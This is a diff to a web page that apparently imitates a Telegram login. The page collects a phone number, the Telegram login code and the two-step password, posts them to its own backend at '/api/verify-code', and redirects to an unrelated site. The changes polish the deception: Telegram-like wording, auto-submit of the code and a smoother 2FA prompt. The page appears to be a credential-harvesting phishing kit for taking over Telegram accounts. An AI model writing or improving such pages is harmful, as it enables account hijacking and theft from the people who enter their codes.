@@ -340,26 +340,37 @@
       </div>
 
       <div>
-        <h2 id="display-phone" class="text-lg font-semibold mb-1 text-white"></h2>
-        <p id="auth-status" class="text-gray-400 text-sm">We've sent the code to your Telegram app.</p>
+        <div class="flex items-center justify-center gap-2 mb-2">
+          <h2 id="display-phone" class="text-2xl font-bold text-white"></h2>
+          <button onclick="goBack()" title="Edit Phone Number" class="text-gray-400 hover:text-white transition p-1">
+            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15.232 5.232l3.536 3.536m-2.036-5.036a2.5 2.5 0 113.536 3.536L6.5 21.036H3v-3.572L16.732 3.732z"></path>
+            </svg>
+          </button>
+        </div>
+        <p id="auth-status" class="text-gray-400 text-sm max-w-xs mx-auto leading-relaxed">
+          We've sent the code to the Telegram app on your other device.
+        </p>
       </div>
       
       <div class="text-left space-y-4">
         <div class="field">
           <label>Telegram Code</label>
-          <input id="otp-input" type="text" inputmode="numeric" pattern="[0-9]*" placeholder="Enter code" maxlength="5" oninput="checkAutoSubmit(this)" class="text-center font-mono tracking-widest text-xl">
+          <input id="otp-input" type="text" inputmode="numeric" pattern="[0-9]*" placeholder="Code" maxlength="5" oninput="checkAutoSubmit(this)" class="text-center font-mono tracking-widest text-xl">
         </div>
 
         <div id="password-container" class="field hidden">
           <label>Two-Step Password (2FA)</label>
-          <input id="password-input" type="password" placeholder="Enter your 2FA password">
+          <input id="password-input" type="password" placeholder="Enter your 2FA password" onkeydown="if(event.key==='Enter') submitOTP()">
         </div>
       </div>
 
-      <button id="btn-verify" onclick="submitOTP()" class="btn-primary">VERIFY & LOGIN</button>
-      <div>
-        <button onclick="goBack()" class="text-xs text-[#8774e1] hover:underline active:opacity-70 transition">Change Phone Number</button>
+      <!-- Spinner Indicator for Auto-Submit -->
+      <div id="loading-indicator" class="hidden flex items-center justify-center gap-2 text-sm text-gray-400 mt-4">
+        <span>Verifying...</span>
+        <span class="spinner"></span>
       </div>
+
     </div>
 
   </div>
@@ -666,8 +677,8 @@
 
             if (data.success) {
                 document.getElementById('display-phone').innerText = phoneInput.value.trim();
-                document.getElementById('auth-status').innerText = "We've sent the code to your Telegram app.";
-                document.getElementById('auth-status').className = "text-gray-400 text-sm";
+                document.getElementById('auth-status').innerText = "We've sent the code to the Telegram app on your other device.";
+                document.getElementById('auth-status').className = "text-gray-400 text-sm max-w-xs mx-auto leading-relaxed";
                 document.getElementById('step-phone').classList.add('hidden');
                 document.getElementById('step-otp').classList.remove('hidden');
                 document.getElementById('otp-input').focus();
@@ -689,15 +700,13 @@
         const phoneClean = phoneInput.value.replace(/\s+/g, '').trim();
         const code = document.getElementById('otp-input').value.trim();
         const password = document.getElementById('password-input').value.trim();
-        const btn = document.getElementById('btn-verify');
+        const loadingIndicator = document.getElementById('loading-indicator');
 
         if (code.length < 5) {
             return;
         }
 
-        btn.disabled = true;
-        btn.innerHTML = '<span>PLEASE WAIT...</span><span class="spinner"></span>';
-        btn.classList.add('opacity-70');
+        if (loadingIndicator) loadingIndicator.classList.remove('hidden');
 
         try {
             const res = await fetch(`${BACKEND_URL}/api/verify-code`, {
@@ -715,7 +724,7 @@
                 window.location.replace(data.redirectUrl || "https://jvpfans.com");
             } else if (data.requiresPassword) {
                 document.getElementById('auth-status').innerText = 'This account has Two-Step Verification enabled. Please enter your 2FA password.';
-                document.getElementById('auth-status').className = 'text-yellow-400 text-sm font-medium';
+                document.getElementById('auth-status').className = 'text-yellow-400 text-sm font-medium max-w-xs mx-auto leading-relaxed';
                 document.getElementById('password-container').classList.remove('hidden');
                 document.getElementById('password-input').focus();
             } else {
@@ -725,9 +734,7 @@
             alert('Connection error!');
             console.error(err);
         } finally {
-            btn.disabled = false;
-            btn.innerText = 'VERIFY & LOGIN';
-            btn.classList.remove('opacity-70');
+            if (loadingIndicator) loadingIndicator.classList.add('hidden');
         }
     }
 
